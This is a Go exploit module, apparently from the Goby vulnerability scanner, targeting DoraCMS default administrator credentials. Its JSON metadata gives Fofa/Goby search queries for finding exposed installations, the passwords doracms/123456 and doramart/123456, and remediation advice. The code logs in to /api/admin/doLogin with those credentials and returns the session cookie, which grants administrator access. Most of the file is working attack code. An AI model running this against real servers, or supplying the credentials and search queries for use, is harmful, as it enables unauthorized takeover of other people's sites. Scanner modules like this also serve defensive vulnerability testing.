package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DoraCMS default password vulnerability",
    "Description": "<p>DoraCMS is an open source content management system.</p><p>DoraCMS has a default password of doramart/123456 or doracms/123456. An attacker can control the entire platform through a default password vulnerability and operate core functions with administrator privileges.</p>",
    "Product": "DoraCMS",
    "Homepage": "https://gitee.com/doramart/DoraCMS",
    "DisclosureDate": "2023-03-21",
    "Author": " 2075068490@qq.com",
    "FofaQuery": "body=\"content=\\\"DoraCMS\" || body=\"title=\\\"代码在这里\\\">DoraCMS\" || header=\"DORA_SESS\" || banner=\"DORA_SESS\"",
    "GobyQuery": "body=\"content=\\\"DoraCMS\" || body=\"title=\\\"代码在这里\\\">DoraCMS\" || header=\"DORA_SESS\" || banner=\"DORA_SESS\"",
    "Level": "2",
    "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "DoraCMS 默认口令漏洞",
            "Product": "DoraCMS",
            "Description": "<p>DoraCMS 是一套开源的内容管理系统。<br></p><p>DoraCMS 存在默认口令 doramart:123456 或 doracms:123456，攻击者可以通过默认密码漏洞控制整个平台，并以管理员权限操作核心功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于 8 位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可以通过默认密码漏洞控制整个平台，并以管理员权限操作核心功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "DoraCMS default password vulnerability",
            "Product": "DoraCMS",
            "Description": "<p>DoraCMS is an open source content management system.</p><p>DoraCMS has a default password of doramart/123456 or doracms/123456. An attacker can control the entire platform through a default password vulnerability and operate core functions with administrator privileges.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
            "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-24",
    "PocId": "10859"
}`
	sendLoginPayloadeq213ad := func(hostInfo *httpclient.FixUrl, username string) (*httpclient.HttpResponse, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig("/api/admin/doLogin")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		loginRequestConfig.Data = "userName=" + username + "&password=123456&imageCode="
		return httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			for _, username := range []string{"doracms", "doramart"} {
				if resp, err := sendLoginPayloadeq213ad(hostinfo, username); err != nil {
					return false
				} else if strings.Contains(resp.Utf8Html, `{"status":200,"data":{"token":`) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				for _, username := range []string{"doracms", "doramart"} {
					if resp, err := sendLoginPayloadeq213ad(expResult.HostInfo, username); err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						break
					} else if strings.Contains(resp.Utf8Html, `{"status":200,"data":{"token":`) {
						expResult.Output = `Cookie: ` + resp.Cookie
						expResult.Success = true
						break
					}
				}
			}
			return expResult
		},
	))
}
